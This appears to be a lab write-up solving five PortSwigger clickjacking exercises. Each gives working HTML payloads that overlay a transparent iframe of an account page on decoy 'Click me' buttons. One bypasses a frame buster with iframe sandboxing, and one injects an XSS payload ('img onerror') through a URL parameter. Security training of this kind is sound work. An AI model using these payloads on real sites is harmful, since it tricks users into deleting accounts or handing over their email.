### 1. Lab: Basic clickjacking with CSRF token protection
> This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.
To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.
You can log in to your own account using the following credentials: `wiener:peter`

In order to overlay the exploit, we will use iframe with div that will delete the account.
```js
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
div {
        position:absolute;
        top:450px;
        left:100px;
        z-index: 1;
    }

</style>
<div>click</div>
<iframe src="https://0a9c00f8043f89f680a80375007a00ec.web-security-academy.net/my-account?id=wiener"></iframe>
```

### 2. Lab: Clickjacking with form input data prefilled from a URL parameter
> This lab extends the basic clickjacking example in [Lab: Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected). The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.
You can log in to your own account using the following credentials: `wiener:peter`

Similar to previous lab
```js
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:460px;
        left:100px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a0300310472c7628083124c00f500a3.web-security-academy.net/my-account?email=haaack2er@attacker-website.com"></iframe>
```
### 3. Lab: Clickjacking with a frame buster script
> This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?
To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.
You can log in to your own account using the following credentials: `wiener:peter`

Same payload as previous, we just have to add: `sandbox="allow-forms"`
```js
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:460px;
        left:100px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0a26009403604ebe80ca0311005500b6.web-security-academy.net/my-account?email=haaack2er@attacker-website.com"></iframe>
```

### 4. Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
> This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the `print()` function.

This application contains Submit feedback form, we will enter the details and submit it. We will see that `test` which is in `name` is reflected in response.
![[Pasted image 20250826221406.png]]
If we use `print()` instead of `test`, the payload will get executed! `<img src=1 onerror=print()>`. So we will simply use that XSS in order to submit the form.
```js
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:610px;
        left:100px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe
src="https://0a0700a70356a176801cc15600e10093.web-security-academy.net/feedback?name=<img src=x onerror=print()>&email=haacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

### 5. Lab: Multistep clickjacking
> This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.
You can log in to the account yourself using the following credentials: `wiener:peter`

Same as before, only change is, instead of one div, we have to make 2 divs.
```js
<style>
	iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
	}
   .firstClick, .secondClick {
        position:absolute;
        top:510px;
        left:100px;
        z-index: 1;
	}
   .secondClick {
		top:300px;
		left:250px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0ae600390320605187e9392600250049.web-security-academy.net/my-account"></iframe>
```